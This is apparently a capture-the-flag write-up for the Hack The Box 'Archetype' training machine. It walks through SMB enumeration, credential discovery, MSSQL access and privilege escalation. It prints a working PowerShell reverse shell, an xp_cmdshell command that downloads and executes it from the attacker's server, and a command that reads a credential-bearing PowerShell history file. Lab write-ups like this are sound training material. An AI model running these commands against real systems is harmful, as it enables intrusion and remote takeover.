# HTB - Archetype

I've been wanting to get into Hack The Box for a while now. The first machine I've worked on was Archetype. It's a machine labelled as *Very Easy* and is part of HTB's *Starting Point*. So let's get started:

The first thing we are going to do is an initial Nmap scan with the tags : `-sC` (to tell Nmap to use it's default scripts), `-sV` (to get more information about the services running on the different ports of the machine) and using `-oN` we save the scan in a file. We get the following output:

![Archetype/nmap_initial.png](/images/Archetype/nmap_initial.png)

Okay, so we can identify this box as a Windows machine and we find out that there is a Microsoft SQL Server running on port `1433` and there is a Samba on port `445`.

We also run a more aggressive (`-A`) Nmap scan on all ports (`-p-`) to get more information. The output is as following:

![Archetype/nmap_all_ports_aggressive.png](/imges/Archetype/nmap_all_ports_aggressive.png)

We don't get any interesting additional information here so let's move to on to enumerating Samba.

The initial nmap scan tells us that we can access Samba using the `guest` account, so we will do just that using `smbmap`. We use `-u` to specify the user and `-H` to specify the host's IP. 

![Archetype\smbmap.png](/images/Archetype/smbmap.png)

We find out that backups and IPC$ are accessible as read only. So using smbclient we will access the both of them. First let's check out `backups`:

![Archetype/smbclient_backups.png](/images/Archetype/smbclient_backups.png)

We find an interesting file here, `prod.dtsConfig`. We download it onto our machine using `get`.

Now let's take a look at `IPC$`:

![Archetype/smbclient_ipc.png](/images/Archetype/smbclient_ipc.png)

As you can see, we are unable to get any information from `IPC$` so let's take a look at `prod.dtsConfig`'s content.

![Archetype/prod_dtsConfig.png](/images/Archetype/prod_dtsConfig.png)

We find creds here that look to be for the mssql server: `Archetype/sql_svc:M3g4c0rp123` (Note: the format here is `username:password`)

Let's try getting in the MSSQL server using the creds we just found. We will be using an impacket script called `mssqlclient.py`. This script is already on kali linux but can be found [here](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py). The full command is: `python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.10.10.27`.

![Archetype/mssql.png](/images/Archetype/mssql.png)

Great, it worked. The first thing we are going to run is `enable_xp_cmdshell`  and we will prepare a powershell reverse shell on our machine that we are going to use to access the machine.

The code of the reverse shell is: 

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKING-IP>", <port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =  $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
We are going to host the reverse shell file using the module `http.server` in python3 and then we'll download it and execute it on the machine we are trying to hack. We run `python3 -m http.server` in the directory containing our powershell reverse shell on our attacking machine. We then run `nc -lnvp <port>` on our attacking machine so we can get the reverse shell. (Note: the `<port>` specified here is the same one specified in the reverse shell code).

Now we go back to mssql server and run `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.217/shell.ps1\");"` to download and execute the reverse shell.

![Archetype/call_revshell.png](/images/Archetype/call_revshell.png) 

Wouhou we get a call back on our attacking machine and we have a reverse shell. Now let's enumerate the machine to find a way to escalate our privileges. 

On this machine, we are able to take a look at the command history of powershell and if we run: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` we get the administrator's password: `MEGACORP_4dm1n!!`.

![Archetype/history_cmd.png](/images/Archetype/history_cmd.png)

Okay great now we just have to reconnect to the machine as administrator using another impacket script, `psexec.py`. We run `python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27` and *voilà*!

![Archetype/psexec.png](/images/Archetype/psexec.png)

Now we just need to get the flags!


